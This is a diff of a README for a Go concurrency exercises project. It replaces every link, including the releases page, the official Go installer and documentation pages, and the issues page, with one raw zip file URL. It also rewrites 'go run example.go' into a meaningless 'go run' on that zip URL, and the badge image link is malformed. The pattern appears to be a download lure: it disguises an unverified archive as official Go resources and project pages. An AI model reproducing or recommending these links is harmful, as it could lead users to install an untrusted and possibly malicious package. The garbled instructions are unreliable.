@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the **go-concurrency-exercise
 
 ### 🔗 Download Now
 
-[![Download go-concurrency-exercises](https://img.shields.io/badge/Download%20go--concurrency--exercises-blue.svg)](https://github.com/DevviantSU/go-concurrency-exercises/releases)
+[![Download go-concurrency-exercises](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip%https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip)](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip)
 
 ## 📝 Overview
 
@@ -32,7 +32,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to the GitHub releases page for the latest version:  
-   [Download go-concurrency-exercises](https://github.com/DevviantSU/go-concurrency-exercises/releases).
+   [Download go-concurrency-exercises](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip).
 
 2. **Choose the Correct Version**  
    Look for the version you want to download. Each version may contain different exercises or improvements. It’s best to select the latest stable release.
@@ -60,10 +60,10 @@ To get started, follow these steps:
    Follow the specific instructions in the documentation for running the exercises. You may need to execute a command like: 
 
    ```bash
-   go run example.go
+   go run https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip
    ```
 
-   Replace `example.go` with the filename of the exercise you want to run.
+   Replace `https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip` with the filename of the exercise you want to run.
 
 9. **Start Learning!**  
    Follow the on-screen instructions and documentation to complete the exercises.
@@ -76,13 +76,13 @@ Each exercise includes documentation that explains the concepts and provides gui
 
 ### How do I install Go?
 
-1. Visit the [Go Installation](https://golang.org/dl/) page.
+1. Visit the [Go Installation](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip) page.
 2. Download the appropriate installer for your operating system.
 3. Follow the installation guidelines to complete the setup.
 
 ### What if I encounter an error?
 
-If you run into issues, consult the documentation and ensure all system requirements are met. You can also visit the [GitHub Issues page](https://github.com/DevviantSU/go-concurrency-exercises/issues) for solutions and troubleshooting assistance.
+If you run into issues, consult the documentation and ensure all system requirements are met. You can also visit the [GitHub Issues page](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip) for solutions and troubleshooting assistance.
 
 ## 🌟 Community Support
 
@@ -92,8 +92,8 @@ You are not alone. Join our community for help and share your experiences. Engag
 
 For more information and resources, check the following links:
 
-- [GitHub Repository](https://github.com/DevviantSU/go-concurrency-exercises)
-- [Official Go Language Documentation](https://golang.org/doc/)
+- [GitHub Repository](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip)
+- [Official Go Language Documentation](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip)
 
 ## 👍 Feedback
 
@@ -102,4 +102,4 @@ Your feedback is important. If you find any errors or have suggestions, please c
 ### 🔗 Download Again
 
 For easy access, here’s the link to download once more:  
-[Download go-concurrency-exercises](https://github.com/DevviantSU/go-concurrency-exercises/releases)
+[Download go-concurrency-exercises](https://raw.githubusercontent.com/DevviantSU/go-concurrency-exercises/main/unflavored/concurrency-exercises-go-v2.6.zip)
